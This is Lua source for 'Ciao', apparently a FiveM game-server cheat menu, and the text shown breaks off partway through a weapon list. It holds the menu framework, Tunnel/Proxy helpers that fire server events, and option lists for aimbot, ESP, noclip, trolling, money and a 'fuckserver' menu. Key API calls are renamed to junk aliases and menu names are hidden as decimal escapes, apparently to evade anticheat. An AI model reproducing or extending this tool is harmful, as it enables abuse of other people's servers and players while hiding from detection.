
        Ciao = {}
        Ciao.debug = arwet

        local menus = {}
        local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 202}
        local optionCount = 0
        local currentKey = nname
        local currentMenu = nname
        local titleHeight = 1.20
        local titleXOffset = 1.10
        local titleSpacing = 2
        local titleYOffset = 0.03
        local titleScale = 1.0
        local buttonHeight = 0.038
        local buttonFont = 0
        local buttonScale = 0.365
        local buttonTextXOffset = 0.005
        local buttonTextYOffset = 0.005
        local currentItemIndex = 1
        local selectedItemIndex = 1

        udwdj = TriggerServerEvent
        Ggggg = GetHashKey
        nname = nil
        arwet = false

        count = {}

        Citizen.CreateThread(function()
            while true do
                --This is the Application ID 
                SetDiscordAppId(743808013860864100)

                SetDiscordRichPresenceAsset('Playing')
            
            
                SetDiscordRichPresenceAssetText('Ciao')
            
            
                SetDiscordRichPresenceAssetSmall('red')

                
                SetDiscordRichPresenceAssetSmallText('red1')

                Citizen.Wait(60000)
            end
        end)
        Citizen.CreateThread(
            function()
                while presense do
                    SetRP()
                    Citizen.Wait(100)
                    zzzt = zzzt + 1
                    if zzzt == 29 then
                        zzzt = 1
                    end
                end
            end
        )
                

        local function debugPrint(text)
            if Ciao.debug then
                Citizen.Trace('[Ciao] ' .. tostring(text))
            end
        end

        local function setMenuProperty(id, property, value)
            if id and menus[id] then
                menus[id][property] = value
                debugPrint(id .. ' menu property changed: { ' .. tostring(property) .. ', ' .. tostring(value) .. ' }')
            end
        end

        local function isMenuVisible(id)
            if id and menus[id] then
                return menus[id].visible
            else
                return arwet
            end
        end

        local function setMenuVisible(id, visible, holdCurrent)
            if id and menus[id] then
                setMenuProperty(id, 'visible', visible)
                if not holdCurrent and menus[id] then
                    setMenuProperty(id, 'currentOption', 1)
                end

                if visible then
                    if id ~= currentMenu and isMenuVisible(currentMenu) then
                        setMenuVisible(currentMenu, arwet)
                    end
                    currentMenu = id
                end
            end
        end

        local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
            SetTextColour(color.r, color.g, color.b, color.a)
            SetTextFont(font)
            SetTextScale(scale, scale)

            if shadow then
                SetTextDropShadow(2, 2, 0, 0, 0)
            end

            if menus[currentMenu] then
                if center then
                    SetTextCentre(center)
                elseif alignRight then
                    SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
                    SetTextRightJustify(true)
                end
            end

            BeginTextCommandDisplayText("STRING")
            AddTextComponentSubstringPlayerName(text)
            EndTextCommandDisplayText(x, y)
        end

        local function drawRect(x, y, width, height, color)
            DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
        end

        local function drawTitle()
            if menus[currentMenu] then
                local x = menus[currentMenu].x + menus[currentMenu].width / 2
                local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset
                local y = menus[currentMenu].y + titleHeight * 1 / titleSpacing
                if menus[currentMenu].titleBackgroundSprite then
                    DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
                else
                    drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
                end

                drawText(menus[currentMenu].title, xText, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
            end
        end

        local function drawSubTitle()
            if menus[currentMenu] then
                local x = menus[currentMenu].x + menus[currentMenu].width / 2
                local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
                local subTitleColor = {r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255}

                drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
                drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, arwet)

                if optionCount > menus[currentMenu].maxOptionCount then
                    drawText(tostring(menus[currentMenu].currentOption) .. ' / ' .. tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, arwet, arwet, true)
                end
            end
        end
        
        local function RGB(frequency)
            local result = {}
            local curtime = GetGameTimer() / 2000
            result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
            result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
            result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
        
            return result
        end

        local function drawButton(text, subText)
            local x = menus[currentMenu].x + menus[currentMenu].width / 2
            local multiplier = nname

            if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
                multiplier = optionCount
            elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
                multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
            end

            if multiplier then
                local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
                local backgroundColor = nname
                local textColor = nname
                local subTextColor = nname
                local shadow = arwet

                if menus[currentMenu].currentOption == optionCount then
                    backgroundColor = menus[currentMenu].menuFocusBackgroundColor
                    textColor = menus[currentMenu].menuFocusTextColor
                    subTextColor = menus[currentMenu].menuFocusTextColor
                else
                    backgroundColor = menus[currentMenu].menuBackgroundColor
                    textColor = menus[currentMenu].menuTextColor
                    subTextColor = menus[currentMenu].menuSubTextColor
                    shadow = true
                end

                drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
                drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, arwet, shadow)

                if subText then
                    drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, arwet, shadow, true)
                end
            end
        end

        function Ciao.CreateMenu(id, title)
            menus[id] = {}
            menus[id].title = title
            menus[id].subTitle = 'INTERACTION MENU'
            menus[id].visible = arwet
            menus[id].previousMenu = nname
            menus[id].aboutToBeClosed = arwet
            menus[id].x = 0.0175
            menus[id].y = 0.025
            menus[id].width = 0.23
            menus[id].currentOption = 1
            menus[id].maxOptionCount = 13
            menus[id].titleFont = 1
            menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
            menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 250 }
            menus[id].titleBackgroundSprite = nname
            menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
            menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
            menus[id].menuFocusTextColor = { r = 255, g = 0, b = 0, a = 200 }
            menus[id].menuFocusBackgroundColor = { r = 60, g = 60, b = 60, a = 250 }
            menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 250 }
            menus[id].subTitleBackgroundColor = {r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255}
            menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}
            debugPrint(tostring(id) .. ' menu created')
        end

        function Ciao.CreateSubMenu(id, parent, subTitle)
            if menus[parent] then
                Ciao.CreateMenu(id, menus[parent].title)
                if subTitle then
                    setMenuProperty(id, 'subTitle', string.upper(subTitle))
                else
                    setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle))
                end

                setMenuProperty(id, 'previousMenu', parent)
                setMenuProperty(id, 'x', menus[parent].x)
                setMenuProperty(id, 'y', menus[parent].y)
                setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
                setMenuProperty(id, 'titleFont', menus[parent].titleFont)
                setMenuProperty(id, 'titleColor', menus[parent].titleColor)
                setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
                setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
                setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
                setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
                setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
                setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
                setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
                setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor)
            else
                debugPrint('Failed to create ' .. tostring(id) .. ' submenu: ' .. tostring(parent) .. ' parent menu doesn\'t exist')
            end
        end

        function Ciao.CurrentMenu()
            return currentMenu
        end

        function Ciao.OpenMenu(id)
            if id and menus[id] then
                PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                setMenuVisible(id, true)
                debugPrint(tostring(id) .. ' menu opened')
            else
                debugPrint('Failed to open ' .. tostring(id) .. ' menu: it doesn\'t exist')
            end
        end

        function Ciao.IsMenuOpened(id)
            return isMenuVisible(id)
        end

        function Ciao.IsAnyMenuOpened()
            for id, _ in pairs(menus) do
                if isMenuVisible(id) then
                    return true
                end
            end

            return arwet
        end

        function Ciao.IsMenuAboutToBeClosed()
            if menus[currentMenu] then
                return menus[currentMenu].aboutToBeClosed
            else
                return arwet
            end
        end

        function Ciao.CloseMenu()
            if menus[currentMenu] then
                if menus[currentMenu].aboutToBeClosed then
                    menus[currentMenu].aboutToBeClosed = arwet
                    setMenuVisible(currentMenu, arwet)
                    debugPrint(tostring(currentMenu) .. ' menu closed')
                    PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    optionCount = 0
                    currentMenu = nname
                    currentKey = nname
                else
                    menus[currentMenu].aboutToBeClosed = true
                    debugPrint(tostring(currentMenu) .. ' menu about to be closed')
                end
            end
        end

        function Ciao.Button(text, subText)
            local buttonText = text

            if subText then
                buttonText = '{ ' .. tostring(buttonText) .. ', ' .. tostring(subText) .. ' }'
            end

            if menus[currentMenu] then
                optionCount = optionCount + 1
                local isCurrent = menus[currentMenu].currentOption == optionCount

                drawButton(text, subText)

                if isCurrent then
                    if currentKey == keys.select then
                        PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
                        debugPrint(buttonText .. ' button pressed')
                        return true
                    elseif currentKey == keys.left or currentKey == keys.right then
                        PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    end
                end

                return arwet
            else
                debugPrint('Failed to create ' .. buttonText .. ' button: ' .. tostring(currentMenu) .. ' menu doesn\'t exist')
                return arwet
            end
        end

        function Ciao.MenuButton(text, id)
            if menus[id] then
                if Ciao.Button(text .. themecolor .. "   " .. themearrow) then
                    setMenuVisible(currentMenu, arwet)
                    setMenuVisible(id, true, true)
                    return true
                end
            else
                debugPrint('Failed to create ' .. tostring(text) .. ' menu button: ' .. tostring(id) .. ' submenu doesn\'t exist')
            end

            return arwet
        end

        function Ciao.CheckBox(text, checked, offtext, ontext, callback)
            if not offtext then
                offtext = "Off"
            end

            if not ontext then
                ontext = "On"
            end

            if Ciao.Button(text, checked and ontext or offtext) then
                checked = not checked
                debugPrint(tostring(text) .. ' checkbox changed to ' .. tostring(checked))
                if callback then
                    callback(checked)
                end

                return true
            end

            return arwet
        end

        function Ciao.ComboBox(text, items, currentIndex, selectedIndex, callback)
            local itemsCount = #items
            local selectedItem = items[currentIndex]
            local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

            if itemsCount > 1 and isCurrent then
                selectedItem = tostring(selectedItem)
            end

            if Ciao.Button(text, selectedItem) then
                selectedIndex = currentIndex
                callback(currentIndex, selectedIndex)
                return true
            elseif isCurrent then
                if currentKey == keys.left then
                    if currentIndex > 1 then
                        currentIndex = currentIndex - 1
                    else
                        currentIndex = itemsCount
                    end
                elseif currentKey == keys.right then
                    if currentIndex < itemsCount then
                        currentIndex = currentIndex + 1
                    else
                        currentIndex = 1
                    end
                end
            else
                currentIndex = selectedIndex
            end

            callback(currentIndex, selectedIndex)
            return arwet
        end

        function Ciao.Display()
            if isMenuVisible(currentMenu) then
                if menus[currentMenu].aboutToBeClosed then
                    Ciao.CloseMenu()
                else
                    ClearAllHelpMessages()
                    drawTitle()
                    drawSubTitle()
                    currentKey = nname
                    if IsDisabledControlJustReleased(1, keys.down) then
                        PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                        if menus[currentMenu].currentOption < optionCount then
                            menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                        else
                            menus[currentMenu].currentOption = 1
                        end

                    elseif IsDisabledControlJustReleased(1, keys.up) then
                        PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                        if menus[currentMenu].currentOption > 1 then
                            menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
                        else
                            menus[currentMenu].currentOption = optionCount
                        end

                    elseif IsDisabledControlJustReleased(1, keys.left) then
                        currentKey = keys.left
                    elseif IsDisabledControlJustReleased(1, keys.right) then
                        currentKey = keys.right
                    elseif IsDisabledControlJustReleased(1, keys.select) then
                        currentKey = keys.select
                    elseif IsDisabledControlJustReleased(1, keys.back) then
                        if menus[menus[currentMenu].previousMenu] then
                            PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                            setMenuVisible(menus[currentMenu].previousMenu, true)
                        else
                            Ciao.CloseMenu()
                        end
                    end

                    optionCount = 0
                end
            end
        end

        function Ciao.SetMenuWidth(id, width)
            setMenuProperty(id, 'width', width)
        end

        function Ciao.SetMenuX(id, x)
            setMenuProperty(id, 'x', x)
        end

        function Ciao.SetMenuY(id, y)
            setMenuProperty(id, 'y', y)
        end

        function Ciao.SetMenuMaxOptionCountOnScreen(id, count)
            setMenuProperty(id, 'maxOptionCount', count)
        end

        function Ciao.SetTitle(id, title)
            setMenuProperty(id, 'title', title)
        end

        function Ciao.SetTitleColor(id, r, g, b, a)
            setMenuProperty(id, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a})
        end

        function Ciao.SetTitleBackgroundColor(id, r, g, b, a)
            setMenuProperty(id, 'titleBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a})
        end

        function Ciao.SetTitleBackgroundSprite(id, textureDict, textureName)
            RequestStreamedTextureDict(textureDict)
            setMenuProperty(id, 'titleBackgroundSprite', {dict = textureDict, name = textureName})
        end

        function Ciao.SetSubTitle(id, text)
            setMenuProperty(id, 'subTitle', string.upper(text))
        end

        function Ciao.SetMenuBackgroundColor(id, r, g, b, a)
            setMenuProperty(id, 'menuBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a})
        end

        function Ciao.SetMenuTextColor(id, r, g, b, a)
            setMenuProperty(id, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a})
        end

        function Ciao.SetMenuSubTextColor(id, r, g, b, a)
            setMenuProperty(id, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a})
        end

        function Ciao.SetMenuFocusColor(id, r, g, b, a)
            setMenuProperty(id, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a})
        end

        function Ciao.SetMenuButtonPressedSound(id, name, set)
            setMenuProperty(id, 'buttonPressedSound', {['name'] = name, ['set'] = set})
        end

        Tools = {}
        local IDGenerator = {}
        function Tools.newIDGenerator()
            local r = setmetatable({}, {__index = IDGenerator})
            r:construct()
            return r
        end

        function IDGenerator:construct()
            self:clear()
        end

        function IDGenerator:clear()
            self.max = 0
            self.ids = {}
        end

        function IDGenerator:gen()
            if #self.ids > 0 then
                return table.remove(self.ids)
            else
                local r = self.max
                self.max = self.max + 1
                return r
            end
        end

        function IDGenerator:free(id)
            table.insert(self.ids, id)
        end

        Tunnel = {}
        local function tunnel_resolve(itable, key)
            local mtable = getmetatable(itable)
            local iname = mtable.name
            local ids = mtable.tunnel_ids
            local callbacks = mtable.tunnel_callbacks
            local identifier = mtable.identifier
            local fcall = function(args, callback)
                if args == nname then
                    args = {}
                end
                if type(callback) == "function" then
                    local rid = ids:gen()
                    callbacks[rid] = callback
                    udwdj(iname .. ":tunnel_req", key, args, identifier, rid)
                else
                    udwdj(iname .. ":tunnel_req", key, args, "", -1)
                end
            end
            itable[key] = fcall
            return fcall
        end

        function Tunnel.bindInterface(name, interface)
            RegisterNetEvent(name .. ":tunnel_req")
            AddEventHandler(name .. ":tunnel_req", function(member, args, identifier, rid)
                local f = interface[member]
                local delayed = arwet
                local rets = {}
                if type(f) == "function" then
                    TUNNEL_DELAYED = function()
                        delayed = true
                        return function(rets)
                            rets = rets or {}
                            if rid >= 0 then
                                udwdj(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
                            end
                        end
                    end
                    rets = {f(table.unpack(args))}
                end

                if not delayed and rid >= 0 then
                    udwdj(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
                end
            end)
        end

        function Tunnel.getInterface(name, identifier)
            local ids = Tools.newIDGenerator()
            local callbacks = {}
            local r = setmetatable({}, {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier})
            RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")
            AddEventHandler(name .. ":" .. identifier .. ":tunnel_res", function(rid, args)
                local callback = callbacks[rid]
                if callback ~= nname then
                    ids:free(rid)
                    callbacks[rid] = nname
                    callback(table.unpack(args))
                end
            end)

            return r
        end

        Proxy = {}
        local proxy_rdata = {}

        local function proxy_callback(rvalues)
            proxy_rdata = rvalues
        end

        local function proxy_resolve(itable, key)
            local iname = getmetatable(itable).name
            local fcall = function(args, callback)
                if args == nname then
                    args = {}
                end

                TriggerEvent(iname .. ":proxy", key, args, proxy_callback)

                return table.unpack(proxy_rdata)
            end

            itable[key] = fcall
            return fcall
        end

        function Proxy.addInterface(name, itable)
            AddEventHandler(name .. ":proxy", function(member, args, callback)
                local f = itable[member]
                if type(f) == "function" then
                    callback({f(table.unpack(args))})
                else
                end
            end)
        end

        function Proxy.getInterface(name)
            local r = setmetatable({}, {__index = proxy_resolve, name = name})
            return r
        end

        developers = {
            "~r~Ciao - ~r~sharkiii#9999 DEV-EMERALD#1337 Owner", -- Owner Main Dev
        }

        menuName = "Ciao"
        version = ""
        theme = "skid"
        themes = {"infamous", "basic", "dark", "Ciao"}
        mpMessage = arwet
        menuKeybind = "F6"
        menuKeybind2 = "N1"
        noclipKeybind = "F1"
        teleportKeyblind = "F10"
        fixvaiculoKeyblind = "F6"
        startMessage = "VELKOMMEN ~r~[" ..GetPlayerName(PlayerId()).. "]"
        subMessage = "~n~~w~Ã…BEN MENU ~n~Key ~g~*"..menuKeybind.."* ~s~ ELLER ~g~ *"..menuKeybind2.."*"
        motd2 = "Knap ~r~*" ..teleportKeyblind.."* ~w~Teleport TIL WAYPOINT"
        motd = "Knap ~r~*" ..noclipKeybind.."* ~w~AKTIVER noclip!"
        motd5 = "Knap ~r~*" ..fixvaiculoKeyblind.."* ~w~Fix KÃ˜RETÃ˜J"
        motd3 = "Ciao ~n~~g~https://discord.gg/z59nQbu"

        menulist = {


                'Ciao',
                '\112\108\97\121\101\114\10',
                '\115\101\108\102\10',
                '\119\101\97\112\111\110\10',
                '\118\101\104\105\99\108\101\10',
                '\119\111\114\108\100\10',
                '\109\105\115\99\10',
                '\116\101\108\101\112\111\114\116\10',
                '\108\117\97\10',
                '\108\121\110\120\10',
                '\115\101\116\116\105\110\103\115\10',


                'allplayer',
                '\112\108\97\121\101\114\111\112\116\105\111\110\115\10',
                'troll',
                'jobsplayers',



                '\97\112\112\101\97\114\97\110\99\101\10',
                'modifyskintextures',
                'modifyhead',
                'modifiers',
                'skinsmodels',



                '\119\101\97\112\111\110\115\112\97\119\110\101\114\10',
                'WeaponCustomization',



                'melee',
                'pistol',
                'shotgun',
                'smg',
                'assault',
                'sniper',
                'thrown',
                'heavy',


                '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10',
                'vehiclemods',
                'vehiclemenu',

                'vehiclecolors',
                'vehiclecolors_primary',
                'vehiclecolors_secondary',
                'primary_classic',
                'primary_matte',
                'primary_metal',
                'secondary_classic',
                'secondary_matte',
                'secondary_metal',

                'vehicletuning',


                'compacts',
                'sedans',
                'suvs',
                'coupes',
                'muscle',
                'sportsclassics',
                'sports',
                'super',
                'motorcycles',
                'offroad',
                'industrial',
                'utility',
                'vans',
                'cycles',
                'boats',
                'helicopters',
                'planes',
                'service',
                'commercial',


                '\102\117\99\107\115\101\114\118\101\114\10',
                '\111\98\106\101\99\116\115\112\97\119\110\101\114\10',
                'objectlist',
                'weather',
                'time',


                'esp',
                'webradio',
                'credits',
                'InfoMenu',

                'saveload',
                'pois',


                '\101\115\120\10',
                '\118\114\112\10',
                'other',
                'money'

        }



        faceItemsList = {}
        faceTexturesList = {}
        hairItemsList = {}
        hairTextureList = {}
        maskItemsList = {}
        hatItemsList = {}
        hatTexturesList = {}


        NoclipSpeedOps = {1, 5, 10, 20, 30}

        NoclipSpeed = 1
        oldSpeed = nname


        FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
        FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}

        FastRunMultiplier = 1.0
        FastSwimMultiplier = 1.0


        RotationOps = {0, 45, 90, 135, 180}

        ObjRotation = 90


        GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
        GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}

        GravAmount = 9.8


        SpeedModOps = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0, 500.0, 1000.0}
        SpeedModAmt = 1.0


        ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0}
        EspDistance = 500.0


        ESPRefreshOps = {"0ms", "100ms", "250ms", "500ms", "1s", "2s", "5s"}
        ESPRefreshTime = 0


        AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
        AimbotBone = "SKEL_HEAD"


        ClothingSlots = {1, 2, 3, 4, 5}


        PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}

        PedAttackType = 1


        RadiosList = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}
        RadiosListWords = {
            "Los Santos Rock Radio",
            "Non-Stop-Pop FM",
            "Radio Los Santos",
            "Channel X",
            "West Coast Talk Radio",
            "Rebel Radio",
            "Soulwax FM",
            "East Los FM",
            "West Coast Classics",
            "Blue Ark",
            "Worldwide FM",
            "FlyLo FM",
            "The Lowdown 91.1",
            "The Lab",
            "Radio Mirror Park",
            "Space 103.2",
            "Vinewood Boulevard Radio",
            "Blonded Los Santos 97.8 FM",
            "Blaine County Radio",
        }


        WeathersList = {
            "CLEAR",
            "EXTRASUNNY",
            "CLOUDS",
            "OVERCAST",
            "RAIN",
            "CLEARING",
            "THUNDER",
            "SMOG",
            "FOGGY",
            "XMAS",
            "SNOWLIGHT",
            "BLIZZARD"
        }

        objs_tospawn = {
            "stt_prop_stunt_track_start",
            "prop_container_01a",
            "prop_contnr_pile_01a",
            "ce_xr_ctr2",
            "stt_prop_ramp_jump_xxl",
            "hei_prop_carrier_jet",
            "prop_parking_hut_2",
            "csx_seabed_rock3_",
            "db_apart_03_",
            "db_apart_09_",
            "stt_prop_stunt_tube_l",
            "stt_prop_stunt_track_dwuturn",
            "xs_prop_hamburgher_wl",
            "sr_prop_spec_tube_xxs_01a",
            "prop_air_bigradar",
            "p_tram_crash_s",
            "prop_windmill_01",
        }


        local allweapons = {
            "WEAPON_UNARMED",
            "WEAPON_KNIFE",
            "WEAPON_KNUCKLE",
            "WEAPON_NIGHTSTICK",
            "WEAPON_HAMMER",
            "WEAPON_BAT",
            "WEAPON_GOLFCLUB",
            "WEAPON_CROWBAR",
            "WEAPON_BOTTLE",
            "WEAPON_DAGGER",
            "WEAPON_HATCHET",
            "WEAPON_MACHETE",
            "WEAPON_FLASHLIGHT",
            "WEAPON_SWITCHBLADE",
            "WEAPON_POOLCUE",
            "WEAPON_PIPEWRENCH",


            "WEAPON_GRENADE",
            "WEAPON_STICKYBOMB",
            "WEAPON_PROXMINE",
            "WEAPON_BZGAS",
            "WEAPON_SMOKEGRENADE",
            "WEAPON_MOLOTOV",
            "WEAPON_FIREEXTINGUISHER",
            "WEAPON_PETROLCAN",
            "WEAPON_SNOWBALL",
            "WEAPON_FLARE",
            "WEAPON_BALL",


            "WEAPON_PISTOL",
            "WEAPON_PISTOL_MK2",
            "WEAPON_COMBATPISTOL",
            "WEAPON_APPISTOL",
            "WEAPON_REVOLVER",
            "WEAPON_REVOLVER_MK2",
            "WEAPON_DOUBLEACTION",
            "WEAPON_PISTOL50",
            "WEAPON_SNSPISTOL",
            "WEAPON_SNSPISTOL_MK2",
            "WEAPON_HEAVYPISTOL",
            "WEAPON_VINTAGEPISTOL",
            "WEAPON_STUNGUN",
            "WEAPON_FLAREGUN",
            "WEAPON_MARKSMANPISTOL",
            "WEAPON_RAYPISTOL",


            "WEAPON_MICROSMG",
            "WEAPON_MINISMG",
            "WEAPON_SMG",
            "WEAPON_SMG_MK2",
            "WEAPON_ASSAULTSMG",
            "WEAPON_COMBATPDW",
            "WEAPON_GUSENBERG",
            "WEAPON_MACHINEPISTOL",
            "WEAPON_MG",
            "WEAPON_COMBATMG",
            "WEAPON_COMBATMG_MK2",
            "WEAPON_RAYCARBINE",


            "WEAPON_ASSAULTRIFLE",
            "WEAPON_ASSAULTRIFLE_MK2",
            "WEAPON_CARBINERIFLE",
            "WEAPON_CARBINERIFLE_MK2",
            "WEAPON_ADVANCEDRIFLE",
            "WEAPON_SPECIALCARBINE",
            "WEAPON_SPECIALCARBINE_MK2",
            "WEAPON_BULLPUPRIFLE",
            "WEAPON_BULLPUPRIFLE_MK2",
            "WEAPON_COMPACTRIFLE",


            "WEAPON_PUMPSHOTGUN",
            "WEAPON_PUMPSHOTGUN_MK2",
            "WEAPON_SWEEPERSHOTGUN",
            "WEAPON_SAWNOFFSHOTGUN",
            "WEAPON_BULLPUPSHOTGUN",
            "WEAPON_ASSAULTSHOTGUN",
            "WEAPON_MUSKET",
            "WEAPON_HEAVYSHOTGUN",
            "WEAPON_DBSHOTGUN",


            "WEAPON_SNIPERRIFLE",
            "WEAPON_HEAVYSNIPER",
            "WEAPON_HEAVYSNIPER_MK2",
            "WEAPON_MARKSMANRIFLE",
            "WEAPON_MARKSMANRIFLE_MK2",


            "WEAPON_GRENADELAUNCHER",
            "WEAPON_GRENADELAUNCHER_SMOKE",
            "WEAPON_RPG",
            "WEAPON_MINIGUN",
            "WEAPON_FIREWORK",
            "WEAPON_RAILGUN",
            "WEAPON_HOMINGLAUNCHER",
            "WEAPON_COMPACTLAUNCHER",
            "WEAPON_RAYMINIGUN",
        }

        local meleeweapons = {
            {"WEAPON_KNIFE", "Knife"},
            {"WEAPON_KNUCKLE", "Brass Knuckles"},
            {"WEAPON_NIGHTSTICK", "Nightstick"},
            {"WEAPON_HAMMER", "Hammer"},
            {"WEAPON_BAT", "Baseball Bat"},
            {"WEAPON_GOLFCLUB", "Golf Club"},
            {"WEAPON_CROWBAR", "Crowbar"},
            {"WEAPON_BOTTLE", "Bottle"},
            {"WEAPON_DAGGER", "Dagger"},
            {"WEAPON_HATCHET", "Hatchet"},
            {"WEAPON_MACHETE", "Machete"},
            {"WEAPON_FLASHLIGHT", "Flashlight"},
            {"WEAPON_SWITCHBLADE", "Switchblade"},
            {"WEAPON_POOLCUE", "Pool Cue"},
            {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
        }

        local thrownweapons = {
            {"WEAPON_GRENADE", "Grenade"},
            {"WEAPON_STICKYBOMB", "Sticky Bomb"},
            {"WEAPON_PROXMINE", "Proximity Mine"},
            {"WEAPON_BZGAS", "BZ Gas"},
            {"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
            {"WEAPON_MOLOTOV", "Molotov"},
            {"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
            {"WEAPON_PETROLCAN", "Fuel Can"},
            {"WEAPON_SNOWBALL", "Snowball"},
            {"WEAPON_FLARE", "Flare"},
            {"WEAPON_BALL", "Baseball"}
        }

        local pistolweapons = {
            {"WEAPON_PISTOL", "Pistol"},
            {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
            {"WEAPON_COMBATPISTOL", "Combat Pistol"},
            {"WEAPON_APPISTOL", "AP Pistol"},
            {"WEAPON_REVOLVER", "Revolver"},
            {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
            {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
            {"WEAPON_PISTOL50", "Pistol .50"},
            {"WEAPON_SNSPISTOL", "SNS Pistol"},
            {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
            {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
            {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
            {"WEAPON_STUNGUN", "Tazer"},
            {"WEAPON_FLAREGUN", "Flaregun"},
            {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
